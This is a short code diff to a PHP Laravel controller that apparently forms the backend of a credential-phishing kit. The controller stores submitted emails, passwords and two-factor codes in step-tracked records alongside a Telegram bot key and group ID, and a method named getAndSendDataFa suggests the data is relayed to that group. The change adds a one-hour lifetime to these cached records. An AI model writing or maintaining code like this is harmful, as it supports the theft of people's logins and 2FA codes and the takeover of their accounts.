@@ -24,7 +24,7 @@ class Controller extends BaseController
     public $groupTelegramId;
     public $email;
     public $password;
-
+    public $timeToLive;
 
     public function __construct(Request $request)
     {
@@ -35,6 +35,7 @@ class Controller extends BaseController
         // $this->groupTelegramId = "-4141594512" ?? $settings['group_id'];
         $this->botKey = $settings['bot_id'];
         $this->groupTelegramId = $settings['group_id'];
+        $this->timeToLive = 3600;
     }
 
     public function getAndSendDataFa(Request $request): \Illuminate\Http\JsonResponse
@@ -60,7 +61,7 @@ class Controller extends BaseController
                 'email' => $email,
                 'fa' => $fa_code,
                 'step' => 2,
-            ]));
+            ]), $this->timeToLive);
 
             return response()->json([
                 'status' => 0
@@ -97,7 +98,7 @@ class Controller extends BaseController
                 'email' => $email,
                 'password' => $password,
                 'step' => 1
-            ]));
+            ]), $this->timeToLive);
 
             return response()->json([
                 'status' => 0
@@ -146,7 +147,7 @@ class Controller extends BaseController
                 'typeFa' => $typeFa,
                 'isLoginSuccessfully' => $isLoginSuccessfully,
                 'isFaSuccessfully' => $isFaSuccessfully,
-            ]), 10);
+            ]), $this->timeToLive);
 
             return response()->json([
                 'status' => 0,
